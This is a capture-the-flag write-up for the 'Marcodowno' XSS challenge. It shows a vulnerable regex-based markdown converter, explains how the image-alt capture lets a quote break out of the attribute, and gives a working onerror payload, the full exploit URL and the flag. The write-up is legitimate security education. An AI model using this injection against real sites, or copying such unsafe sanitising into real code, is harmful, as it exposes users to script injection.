
## Title: Marcodowno
**Points:** 105  
**Solves:** 158

### Descriptions: 
Someone told me to use a lib, but real developers rock regex one-liners.

### Solution:

This is an XSS-challenge. You have to submit a url that pops `alert(1)` to get the flag.

We are presented with a webpage that takes input trought the GET-parameter `input`, url-decodes it, converts it from markdown to html and then renders it back to us.

To convert from markdown to html it uses:

```js
function markdown(text){
  text = text.replace(/[<]/g, '').replace(/----/g,'<hr>').replace(/> ?([^\n]+)/g, '<blockquote>$1</blockquote>').replace(/\*\*([^*]+)\*\*/g, '<b>$1</b>').replace(/__([^_]+)__/g, '<b>$1</b>').replace(/\*([^\s][^*]+)\*/g, '<i>$1</i>').replace(/\* ([^*]+)/g, '<li>$1</li>').replace(/##### ([^#\n]+)/g, '<h5>$1</h5>').replace(/#### ([^#\n]+)/g, '<h4>$1</h4>').replace(/### ([^#\n]+)/g, '<h3>$1</h3>').replace(/## ([^#\n]+)/g, '<h2>$1</h2>').replace(/# ([^#\n]+)/g, '<h1>$1</h1>').replace(/(?<!\()(https?:\/\/[a-zA-Z0-9./?#-]+)/g, '<a href="$1">$1</a>').replace(/!\[([^\]]+)\]\((https?:\/\/[a-zA-Z0-9./?#]+)\)/g, '<img src="$2" alt="$1"/>').replace(/(?<!!)\[([^\]]+)\]\((https?:\/\/[a-zA-Z0-9./?#-]+)\)/g, '<a href="$2">$1</a>').replace(/`([^`]+)`/g, '<code>$1</code>').replace(/```([^`]+)```/g, '<code>$1</code>').replace(/\n/g, "<br>");
  return text;
}
```

The function converts using a bunch of regex text-replaces. One of them converts embeded markdown images to html img-tags:

```js
replace(/!\[([^\]]+)\]\((https?:\/\/[a-zA-Z0-9./?#]+)\)/g, '<img src="$2" alt="$1"/>')
```

Group number 1 in the regex, `([^\]]+)`, which gets echoed into `alt="$1"` allows any characters except `]`. Therefore, our paylod becomes something like:

```
![a" onerror="alert(1)](http://example.com)
```

Which results in the following html being rendered to us:

```html
<img src="http://example.com" alt="a" onerror="alert(1)"/>
```

Our url to submit becomes: `http://marcodowno-01.play.midnightsunctf.se:3001/markdown?input=!%5Ba%22%20onerror=%22alert(1)%5D(http://example.com)`.

**Flag:** midnight{wh0_n33ds_libs_wh3n_U_g0t_reg3x?}

